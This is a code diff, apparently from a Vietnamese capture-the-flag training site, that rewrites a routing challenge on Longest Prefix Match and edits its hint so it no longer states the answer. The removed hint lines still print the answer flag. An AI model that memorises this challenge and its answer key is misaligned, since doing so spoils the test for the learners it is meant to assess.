                 description: "Router nhận được gói tin có địa chỉ IP đích là 10.10.20.150. Trong bảng định tuyến có 4 tuyến đường thỏa mãn: 10.0.0.0/8 (Next-Hop A), 10.10.0.0/16 (Next-Hop B), 10.10.20.0/24 (Next-Hop C) và 10.10.20.128/26 (Next-Hop D). Theo luật Longest Prefix Match của Cisco, gói tin sẽ được chuyển tiếp qua Next-Hop nào?",
-                codeSnippet: `Routing Table:
-S    10.0.0.0/8 [1/0] via Next-Hop A
-O    10.10.0.0/16 [110/2] via Next-Hop B
-O    10.10.20.0/24 [110/10] via Next-Hop C
-S    10.10.20.128/26 [1/0] via Next-Hop D
+                codeSnippet: `Bảng định tuyến của Router:
+S    10.0.0.0/8       [1/0]   via Next-Hop A
+O    10.10.0.0/16     [110/2] via Next-Hop B
+O    10.10.20.0/24    [110/5] via Next-Hop C
+S    10.10.20.128/26  [1/0]   via Next-Hop D
 
-Destination IP: 10.10.20.150
-Nhiệm vụ: Nhập tên Next-Hop và độ dài prefix dài nhất:
-FLAG{next_hop_<chữ_cái>_prefix_<số_bit>}`,
+Gói tin IP có địa chỉ đích: 10.10.20.150
+
+---
+YÊU CẦU:
+Theo nguyên lý Longest Prefix Match (LPM), Router sẽ chuyển tiếp gói tin qua Next-Hop nào (chữ cái A, B, C hoặc D) và độ dài prefix dài nhất tương ứng là bao nhiêu bit?
+Cú pháp cờ: FLAG{next_hop_<chữ_cái>_prefix_<số_bit>}
+(Ví dụ: FLAG{next_hop_a_prefix_8})`,
                 hint: `<div class="space-y-2">
     <div>
         <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
@@ -1072,7 +1140,7 @@ FLAG{next_hop_<chữ_cái>_prefix_<số_bit>}`,
         </span>
         <div class="text-amber-100/90 pl-1 mt-1 text-xs">
             • <b>Cisco IOS CLI</b>: <code>show ip route 10.10.20.150</code>.<br>
-            • Nguyên lý Longest Prefix Match (LPM) trong bảng CEF (Cisco Express Forwarding).
+            • Nguyên lý Longest Prefix Match (LPM) trong CEF.
         </div>
     </div>
     <div>
@@ -1080,9 +1148,9 @@ FLAG{next_hop_<chữ_cái>_prefix_<số_bit>}`,
             💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
         </span>
         <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
-            1. Địa chỉ 10.10.20.150 thuộc dải 10.10.20.128 đến 10.10.20.191 của mạng con /26.<br>
-            2. Đây là prefix cụ thể nhất (26 bits mạng). Next-Hop được chọn là <b>D</b>.<br>
-            3. Cờ: <code>FLAG{next_hop_d_prefix_26}</code>.
+            1. Địa chỉ 10.10.20.150 thuộc dải mạng của những prefix nào trong bảng?<br>
+            2. Trong số các prefix khớp, prefix nào có số bit mạng lớn nhất (mặt nạ cụ thể nhất)?<br>
+            3. Tìm chữ cái của Next-Hop tương ứng với prefix dài nhất đó.
         </div>
     </div>
 </div>`,
@@ -1307,7 +1375,7 @@ FLAG{next_hop_<chữ_cái>_prefix_<số_bit>}`,
         const inputVal = this.ui.flagInput.value.trim();
         this.ui.statusBox.classList.remove('hidden');
 
-        // Check flag case-insensitively or strictly
+        // Check flag case-insensitively
         const isCorrect = inputVal.toLowerCase() === c.flag.toLowerCase();
 
         if (isCorrect) {
@@ -1329,7 +1397,7 @@ FLAG{next_hop_<chữ_cái>_prefix_<số_bit>}`,
             // Wrong Flag
             if (window.soundManager) window.soundManager.playWrong();
             this.ui.statusBox.className = "p-3 rounded-xl bg-rose-950/80 border border-rose-500 text-rose-300 font-bold text-center text-xs sm:text-sm";
-            this.ui.statusBox.innerHTML = `❌ CỜ KHÔNG CHÍNH XÁC! Hãy kiểm tra lại log trích xuất hoặc nhấn "💡 Xem gợi ý giải mã cờ".`;
+            this.ui.statusBox.innerHTML = `❌ CỜ KHÔNG CHÍNH XÁC! Hãy kiểm tra lại phân tích dữ liệu hoặc mở "💡 Xem gợi ý giải mã cờ".`;
 
             this.printTerminal(`[FAIL] Invalid flag: "${inputVal}"`, 'text-rose-400');
         }
@@ -1349,7 +1417,7 @@ FLAG{next_hop_<chữ_cái>_prefix_<số_bit>}`,
 Các lệnh được hỗ trợ:
 - list: Xem danh sách thử thách CTF theo bộ lọc
 - cat: Đọc chi tiết thử thách hiện tại (Mô tả & Data Dump)
-- hint: Xem gợi ý công cụ và giải pháp phân tích
+- hint: Xem gợi ý công cụ và giải pháp phân tích (không lộ đáp án)
 - flag <FLAG{...}>: Nộp cờ nhanh qua Terminal
 - tools: Cẩm nang công cụ an ninh mạng thực chiến (Wireshark, Nmap, Burp Suite, Hashcat, Volatility, Scapy, LinPEAS, Ghidra)
 - b64 decode <chuỗi>: Giải mã Base64 nhanh trên console
@@ -1417,7 +1485,6 @@ ${c.codeSnippet}`, 'text-slate-200');
                     if (action === 'decode') {
                         // Standard base64 decode with UTF-16LE fallback check
                         const binaryStr = atob(payload.trim());
-                        // Check if it's UTF-16LE (contains null bytes alternating)
                         let decoded = "";
                         if (binaryStr.includes('\x00')) {
                             // Decode as UTF-16LE
